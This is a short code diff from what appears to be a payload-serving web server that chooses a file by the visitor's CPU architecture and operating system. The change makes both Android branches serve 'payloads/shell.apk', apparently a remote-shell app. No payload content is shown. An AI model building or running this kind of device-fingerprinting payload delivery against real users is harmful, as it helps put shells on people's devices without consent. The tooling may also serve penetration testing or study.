@@ -50,7 +50,7 @@ def index():
         filepath = "payloads/windows_x64"
     
     if arch_os_pattern == "x64 android":
-        filepath = "payloads/android_x64"
+        filepath = "payloads/shell.apk"
     
     if arch_os_pattern == "x86 linux":
         filepath = "payloads/linux_x86"
@@ -59,7 +59,7 @@ def index():
         filepath = "payloads/windows_x86"
     
     if arch_os_pattern == "x86 android":
-        filepath = "payloads/android_x86"
+        filepath = "payloads/shell.apk"
     
     #send set payload
     if filepath == "":
